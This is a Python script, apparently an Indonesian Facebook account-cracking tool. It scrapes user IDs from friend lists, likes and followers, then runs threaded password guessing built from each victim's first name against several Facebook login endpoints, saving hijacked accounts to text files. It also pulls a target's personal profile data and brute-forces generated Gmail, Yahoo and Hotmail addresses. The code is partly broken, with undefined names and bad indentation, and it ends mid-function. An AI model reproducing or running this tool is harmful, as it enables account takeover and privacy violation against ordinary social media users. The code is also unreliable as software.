import requests,bs4,json,os,sys,random,datetime,time,re
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]



x = '\33[m' # DEFAULT

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

P = '\033[0;00m'

J = '\033[0;33m'

S = '\033[0;00m'

N = '\x1b[0m'

I ='\033[0;32m'

C ='\033[0;36m'

M ='\033[0;31m'

U ='\033[0;35m'

K ='\033[0;33m'

P='\033[00m'

h='\033[0;90m'

Q="\033[00m"

kk='\033[0;32m'

ff='\033[0;36m'

G='\033[0;36m'

p='\033[00m'

h='\033[0;90m'

Q="\033[00m"

I='\033[0;32m'

II='\033[0;36m'

m='\033[0;31m'

O ='\033[0;33m'

H='\033[0;33m'

b = '\033[0;36m'

war = "[•]"

B = random.choice([U,I,K,b,M])
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def jalan(kontol):
	for wibu in kontol + "\n":
		sys.stdout.write(wibu)
		sys.stdout.flush()
		time.sleep(0.03)
def back():
	login()
def banner():
	print('''%s
	_______           ______   _______  _                 ______  
       (  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
       | (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
       | (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
       |     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
       | (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
       | ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
       |/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
                                                               
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Rudal-XD
 [\x1b[1;96m+%s] Github   : -
 [\x1b[1;96m+%s] Facebook : gaming bubrah
───────────────────────────────────────────────────────\n'''%(N,N,N,N))

#login
def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				sy4 = json.loads(sy.text)['birthday']
				menu()
			except KeyError:
				login_lagi()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# KONEKSI INTERNET BERMASALAH'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi()

def login_lagi():
	banner()
	sky = '# MASUKAN TOKEN FACEBOOK'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'•'+x+'] Token Fb : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# nice Login berhasil'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu()
	except KeyError:
		sue = '# Login Gagal, Cek token'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login_lagi()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	
def menu():
		banner()
		IP = requests.get('https://api.ipify.org').text
		jalan(' %s[ %sselamat Datang Om %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(N,O,N,IP))
		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
		print(' %s[%s5%s] crack dari followers'%(N,O,N))
		print(' %s[%s6%s] cek opsi akun chekpoint'%(N,O,N))
		print(' %s[%s7%s] cek hasil crack ok,cp'%(N,O,N))
		print(' %s[%s8%s] seting User-Agent'%(N,O,N))
		print(' %s[%s9%s] crack email'%(N,O,N))
		print(' %s[%sG%s] Get data² facebook'%(N,O,N))
		print(' %s[%sK%s] Lapor bug script'%(N,O,N))
		print(' %s[%sA%s] Keluar, hapus token'%(N,O,N))
		self.pilih()
        def pilih(self):
		print(' %s'%(N))
		usna = input(' %s[%s+%s] choose : '%(N,O,N))
		if usna in ['']:
			print(' %s'%(N))
			print(' %s[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()
		elif usna in ['0','00']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s[%s!%s] Cek token kamu'%(N,M,N))
			try:
				lmt = input(' %s[%s+%s] Limit id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))
				z = json.loads(r.text)
				id = []
				for w in z['friends']['data']:
					id.append(z['id'] + '<=>' + w['name'])
			except KeyError:
				print(' %s[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s[%s!%s] Coba jalankan ulang !'%(N,M,N))
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/v2.0/%s?fields=friends.limit(5000)&access_token=%s'%(idt,token))
				e = json.loads(r.text)
				id = []
				for u in e['friends']['data']:
					id.append(u['id'] + '<=>' + u['name'])
			except KeyError:
				print(' %s'%(N))
				jalan(' %s[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['2','02']:
			token = open('token.x','r').read()
			try:
				pler = int(input(' %s[%s•%s] Mau crack berapa id : '%(N,O,N)))
			except:pler = 1
			for ikeh in range(pler):
				ikeh += 1
				try:
					print(' %s'%(N))
					idt = input(' %s[%s•%s] Masukan id yang ke %s : '%(N,O,N,ikeh))
					r = requests.get(f'https://graph.facebook.com/v2.0/{idt}?fields=friends.limit(5000)&access_token={token}')
					z = json.loads(r.text)
					id = []
					for a in z['friends']['data']:
						id.append(a['id'] + '<=>' + a['name'])
				except KeyError:
					pass
				else:
					pass
			crack().fbeh(id)
		elif usna in ['3','03']:
			pepek = open('token.x','r').read()
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,pepek))
				z = json.loads(r.text)
				id = []
				for a in z['data']:
					id.append(a['id'] + '<=>' + a['name'])
			except KeyError:
				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['4','04']:
			memek = open('token.x','r').read()
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,memek))
				z = json.loads(r.text)
				id = []
				for e in z['data']: # MEMEK
					id.append(e['id'] + '<=>' + e['name'])
			except KeyError:
				print(' %s[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['5','05']:
			khamdihiXDX = open('token.x','r').read()
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))
				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s'%(idt,khamdihiXDX))
				z = json.loads(r.text)
				id = []
				for w in z['data']:
					id.append(w['id'] + '<=>' + w['name'])
			except KeyError:
				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['6','06']:
			print(' %s'%(N))
			print(' %s[%s•%s] Masukan -> Cp.txt sebagai file'%(N,O,N))
			files = input(' %s[%s•%s] Masukan files : '%(N,O,N))
			try:
				buka_baju = open(files, "r").readlines()
			except IOError:
				exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(N,M,N,H,files,N))
			for memek in buka_baju:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				print("\n • Account : "+(kontol.replace(" + ","")))
				try:
					khamdihi(titid[0].replace(" + ",""), titid[1])
				except requests.exceptions.ConnectionError:
					pass
			exit("\n%s [%s!%s] Done Ya Anjing"%(N,M,N))
		elif usna in ['7','07']:
			print(' %s '%(N))
			print(' %s [%s1%s] Cek hasil ok'%(N,O,N))
			print(' %s [%s2%s] Cek hasil cp'%(N,O,N))
			print(' %s [%s0%s] Kembali'%(N,O,N))
			print(' %s '%(N))
			hsl = input(' %s [%s•%s] choose : '%(N,O,N))
			if hsl in ['1','01']:
				hasil_ok = open('Ok.txt','r').read()
				if len(hasil_ok) != 0:
					print('\n')
					print('%s[ %shasil okeh %s]'%(N,H,N))
					os.system('cat Ok.txt');exit()
				else:
					print(' %s [%s!%s] Kamu gak dapet hasil okeh :('%(N,O,N))
			elif hsl in ['2','02']:
				hasil_cp = open('Cp.txt','r').read()
				if len(hasil_cp) != 0:
					print('\n')
					print(' %s[ %shasil cepeh kamu %s]'%(N,K,N))
					os.system('cat Cp.txt');exit()
			else:
				menu().main()
		elif usna in ['8','08']:
			print(' %s '%(N))
			print(' %s [%s1%s] Cek user agent default'%(N,O,N))
			print(' %s [%s2%s] Ganti user agent '%(N,O,N))
			print(' %s [%s0%s] Keluar'%(N,O,N))
			print(' %s '%(N))
			pwk = input(' %s [%s+%s] choose : '%(N,O,N))
			if pwk in ['1','01']:
				fika = open('user.txt','r').read()
				print(' %s [%s!%s] User agent sekarang : %s'%(N,O,N,fika))
				time.sleep(4);menu().main()
			elif pwk in ['2','02']:
				ua = input(' %s [%s+%s] Masukan ua baru : '%(N,O,N))
				try:
					nunu = open('user.txt','w')
					nunu.write(ua)
					nunu.close()
					print(' %s [%s!%s] Sukses mengganti ua : %s'%(N,O,N,ua));time.sleep(4);menu().main()
				except:pass
			else:
				menu().main()
		elif usna in ['9','09']:
			data = []
			print(' %s '%(N))
			nama = input(' %s [%s+%s] Target nama : '%(N,O,N))
			print(' %s [%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G '%(N,O,N))
			domain = input(' %s [%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()
			list = {
				'g':'@gmail.com',
				'y':'@yahoo.com',
				'h':'@hotmail.com'
			}
			jml = int(input(' %s [%s+%s] Jumlah target : '%(N,O,N)))
			pwx = input(' %s [%s+%s] Masukan password : '%(N,O,N)).split(',')
			print(' %s [%s+%s] Crack sedang di mulai'%(N,O,N))
			[data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in pwx]}) for e in range(1,jml+1)]
			with khamdihiXD(max_workers=15) as th:
				{th.submit(brute, user['user'], user['pw']): user for user in data}
			exit('%s [%s!%s] Crack telah selezai'%(N,O,N))
		elif usna in ['G','g']:
			target()
		elif usna in ['K','k']:
			nom_wa ='+62895386194665'
			text = input(' %s [%s!%s] Apa yang error ketik di sini : '%(N,O,N))
			url_wa = ("https://api.whatsapp.com/send?phone="+nom_wa+"&text="+text)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		elif usna in ['a','A']:
			os.system('rm -rf token.x');exit()
		elif usna in ['U','u']:
			nom_wa ='+62895386194665'
			kata = input(' %s [%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))
			url_wa = ("https://api.whatsapp.com/+62895386194665?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
			print('%s  [%s+%s] Wrong input'%(N,M,N));time.sleep(2);menu().main()


def target():
    try:
        toket=open('token.x','r').read()
    except KeyError:
        print("\n[!] Token Invalid")
        os.system('rm -rf login.txt')
        login()
    print(' %s '%(N))
    idt = input("  [•] ID Target : ")
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        zy = json.loads(zx.text)
    except KeyError:
        print(" [!] ID NOT found");exit()
    try:
        nm = zy["name"]
    except KeyError:
        nm = ("-")
    try:
        nd = zy["first_name"]
    except KeyError:
        nd = ("-")
    try:
        nt = zy["middle_name"]
    except KeyError:
        nt = ("-")
    try:
        nb = zy["last_name"]
    except KeyError:
        nb = ("-")
    try:
        ut = zy["birthday"]
    except KeyError:
        ut = ("-")
    try:
        gd = zy["gender"]
    except KeyError:
        gd = ("-")
    try:
        em = zy["email"]
    except KeyError:
        em = ("-")
    try:
        lk = zy["link"]
    except KeyError:
        lk = ("-")
    try:
        us = zy["username"]
    except KeyError:
        us = ("-")
    try:
        rg = zy["religion"]
    except KeyError:
        rg = ("-")
    try:
        rl = zy["relationship_status"]
    except KeyError:
        rl = ("-")
    try:
        rls = zy["significant_other"]["name"]
    except KeyError:
        rls = ("-")
    try:
        lc = zy["location"]["name"]
    except KeyError:
        lc = ("-")
    try:
        ht = zy["hometown"]["name"]
    except KeyError:
        ht = ("-")
    try:
        ab = zy["about"]
    except KeyError:
        ab = ("-")
    try:
        lo = zy["locale"]
    except KeyError:
        lo = ("-")
    jalan("  [•] Name : " + nm)
    jalan("  [•] First Name : " + nd)
    jalan("  [•] Middle Name : " + nt)
    jalan("  [•] Last Name : " + nb)
    jalan("  [•] Birthday : " + ut)
    jalan("  [•] Gender : " + gd)
    jalan("  [•] Email : " + em)
    jalan("  [•] Link : " + lk)
    jalan("  [•] Username : " + us)
    jalan("  [•] Religion : " + rg)
    jalan("  [•] Relationship Status : " + rl)
    jalan("  [•] Relationship With : " + rls)
    jalan("  [•] Location : " + lc)
    jalan("  [•] Hometown : " + ht)
    jalan("  [•] About : " + ab)
    jalan("  [•] Locale : " + lo)
    input('  [+] Back to menu, pres enter')
    menu().main()


def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('%s --> %s • %s '%(H,str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('%s * --> %s • %s '%(K,str(user), str(pw)))
        break
  except: pass

def khamdihi(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = random.choice(["Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16"])
	ses = requests.Session()
	#......
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" • Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" • Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("      " +str(opt+1)+" " +ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(P,M,P,oh))
	else:
		print("%s[%s!%s] Error Login Failed!\n"%(N,M,N))


class crack:

	def __init__(self):
		self.id = []
	def fbeh(self,id):
		self.id = id
		print(' %s[%s+%s] Total id : %s%s'%(N,O,N,H,len(id)))
		kham = input(' %s[%s?%s] Gunakan password manual y/t : '%(N,O,N))
		if kham in ['']:
			print(' %s[%s!%s] Jangan kozong !'%(N,M,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(' %s'%(N))
			print(' %s[%s!%s] Gunakan koma untuk pemisahan cnth : sayang,katasandi'%(N,O,N))
			while True:
				pw = input(' %s[%s•%s] Masukan password : '%(N,O,N))
				if pw in ['']:
					print(' %s[%s!%s] Jangan kosong'%(N,M,N))
				elif len(pw)<=5:
					print(' %s[%s!%s] Password harus ada 6 kata/ lebih !!'%(N,M,N))
				else:
					def manual(xnxx=None):
						print('%s '%(N))
						mani = input(' %s[%s•%s] Metode : '%(N,O,N))
						if mani in ['']:
							print(' %s [%s!%s] Jangan kosong anjing'%(N,M,N));self.manual()
						elif mani in ['1','01']:
							print(' %s '%(N))
							print('  [%s*%s] akun Ok akan di simpan di file : Ok.txt'%(O,N))
							print('  [%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.b_api, Nufikha, xnxx)
									except: pass
							exit()
						elif mani in ['2','02']:
							print(' %s '%(N))
							print(' %s [%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
							print(' %s [%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.mbasic,Nufikha,xnxx)
									except: pass
							exit()
						elif mani in ['3','03']:
							print(' %s '%(N))
							print(' %s [%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
							print('%s  [%s*%s] akun Cp akan di simpan di file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.metod2, Nufikha, xnxx)
									except: pass
							exit()
					print(' %s '%(N))
					print(' %s [%s1%s] Metode Free'%(N,O,N))
					print(' %s [%s2%s] Metode Mbasic'%(N,O,N))
					print(' %s [%s3%s] Metode Mobile/M'%(N,O,N))
					manual(pw.split(','))
					break
		elif kham in ['t','T','tidak','Tidak']:
			print(' %s '%(N))
			print(' %s [%s1%s] Metode Free'%(N,O,N))
			print(' %s [%s2%s] Metode Mbasic'%(N,O,N))
			print(' %s [%s3%s] Metode Mobile/Rekomend'%(N,O,N))
			self.otomatis()
	def otomatis(self):
		print(' %s '%(N))
		oto = input(' %s [%s+%s] Crack dengan metode : '%(N,O,N))
		if oto in ['']:
			print(' [%s!%s] jangan kosonh'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.basic()
		elif oto in ['3','03']:
			self.mobilez()
		else:
			print(' [%s!%s] Pilih menu yg bener anjing'%(M,N));self.otomatis()
	def free(self):
		print(' %s '%(N))
		print(' %s [%s*%s] akun okeh akan di simpan di file  : hasil/okeh.txt'%(N,O,N))
		print(' %s [%s*%s] akun cepeh akan di simpan di file : hasil/cepeh.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
					sempak = name.split(' ')
					nun = sempak[0]
					if len(nun)>=6:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					dihi.submit(self.b_api, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()
	def basic(self):
		print(' %s '%(N))
		print(' %s [%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
		print(' %s [%s*%s] akun CP akan di simpan di file : Cp.txt'%(N,O,N))
		print(' %s [%s!%s] Mode pesawat 2 detik jika tidak ada hasil\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
					sempak = name.split(' ')
					nun = sempak[0]
					if len(nun)>=6:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					dihi.submit(self.mbasic, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()

	def mobilez(self):
		print(' %s '%(N))
		print(' %s [%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
		print(' %s [%s*%s] akun CP akan di simpan di file : Cp.txt'%(N,O,N))
		print(' %s [%s!%s] mode pesawat 2 detik jika tidak ada hasil\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					uid, name = nama.split('<=>')
					gas = name.split(' ')
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['123456','sayang','sayangku','bismillah','anjing','bangsat','katasandi','kontol']
					elif len(nun)<=1:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					dihi.submit(self.metod2, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()
	def b_api(self,user,pwx): # Kamu jahat :v
		global loop,ok,cp
		eram = random.choice([M,K,H,U,P,N])
		nufi = random.choice([N,P,U,H,K,M])
		sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16"])
				headers_ = {"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
